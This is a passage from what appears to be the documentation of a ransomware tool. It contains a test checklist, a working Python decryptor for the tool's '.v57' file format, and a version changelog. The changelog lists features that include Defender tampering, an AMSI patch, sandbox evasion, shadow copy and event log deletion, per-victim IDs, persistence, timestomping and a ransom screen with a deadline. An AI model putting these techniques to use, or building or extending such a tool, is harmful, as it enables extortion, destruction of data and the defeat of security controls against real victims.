- [ ] `--no-ps` completes without PowerShell
- [ ] `--no-evade` runs clean
- [ ] Second run reuses the master; no `.v57.v57` files
- [ ] `--max-size 1` skips large files
- [ ] Empty file, 1-byte file, and 4 MiB boundary all round-trip

---

## Appendix A: reference decryptor

Standalone Python, no dependency on this repository. Reproduces the format in [§10](#10-cryptographic-specification).

```python
import base64, hashlib, hmac, os, struct, sys
from Crypto.Cipher import AES

MAGIC = b'\x89VY7\r\n\x1a\n'
HDR = 34
TAG = 16


def unpad(d):
    n = d[-1]
    return d[:-n] if 1 <= n <= 16 else d


def one(master, path):
    with open(path, 'rb') as f:
        blob = f.read()
    if blob[:8] != MAGIC or blob[8] != 2:
        return False
    iv = blob[10:26]
    cth, ctt = struct.unpack('<II', blob[26:34])
    mid = len(blob) - HDR - cth - ctt - TAG
    if mid < 0:
        return False
    head = blob[HDR:HDR + cth]
    tail = blob[len(blob) - TAG - ctt:len(blob) - TAG] if ctt else b''
    middle = blob[HDR + cth:HDR + cth + mid]

    fk = hmac.new(master, b'\x6b' + iv, hashlib.sha256).digest()
    tk = hmac.new(master, b'\x74' + iv, hashlib.sha256).digest()
    ivt = hmac.new(master, b'T' + iv, hashlib.sha256).digest()[:16]

    calc = hmac.new(tk, blob[:HDR] + head + tail, hashlib.sha256).digest()[:TAG]
    if not hmac.compare_digest(calc, blob[len(blob) - TAG:]):
        return False

    out = unpad(AES.new(fk, AES.MODE_CBC, iv).decrypt(head)) + middle
    if ctt:
        out += unpad(AES.new(fk, AES.MODE_CBC, ivt).decrypt(tail))

    dst = path[:-len('.v57')] if path.endswith('.v57') else path + '.out'
    with open(dst, 'wb') as f:
        f.write(out)
    os.remove(path)
    return True


if __name__ == '__main__':
    master = base64.urlsafe_b64decode(sys.argv[1] + '=' * (-len(sys.argv[1]) % 4))
    for root, _d, files in os.walk(sys.argv[2]):
        for name in files:
            if name.endswith('.v57'):
                p = os.path.join(root, name)
                print('OK  ' if one(master, p) else 'FAIL', p)
```

Usage: `python refdec.py <master> <directory>`

---

## Appendix B: changelog

**2.1.1**

- Master also stored DPAPI-protected; re-runs, GUI validation, and `--decrypt` no longer require the private key
- Fixed quiet mode discarding the GUI unlock result
- Fixed elevation, watchdog, and `--self-delete` targeting the ephemeral onefile temp copy instead of the original exe
- Fixed key store and debug log being written to the temp directory
- Restored mtime preservation on decrypt
- Split sandbox hostname signals into strong and weak so `DESKTOP-*` no longer forces a sleep
- Rewrote `gen_lits`, moved inline `_s()` calls to constants
- `strip_zone` and `add_exclusions` now cover the original exe

**2.1.0**

- Registry-only Defender tampering, `-EncodedCommand`, optional AMSI patch
- Sandbox scoring with abort/sleep verdicts
- Hex literal obfuscation, `--gen-lits`
- Self-copy to `%LOCALAPPDATA%\...\Notifications`, timestomp, hidden attribute
- Build hardening: metadata, `no_docstrings`, import pruning, `D3DSCache` tempdir
- Single-invocation `taskkill`, event log wipe folded into the shadow call

**2.0.0**

- RSA-2048-OAEP master wrapping, per-victim extension, victim ID
- Intermittent encryption, cap raised to 2 GB
- Self-elevation, USN journal, `bcdedit`, `powercfg /h off`
- Watchdog
- Fullscreen GUI with live counter and deadline
- Fixed watcher double-encryption race

**1.0.0**

- Initial: AES-256-CBC, XOR'd plaintext key, shadow deletion, persistence, Tk GUI
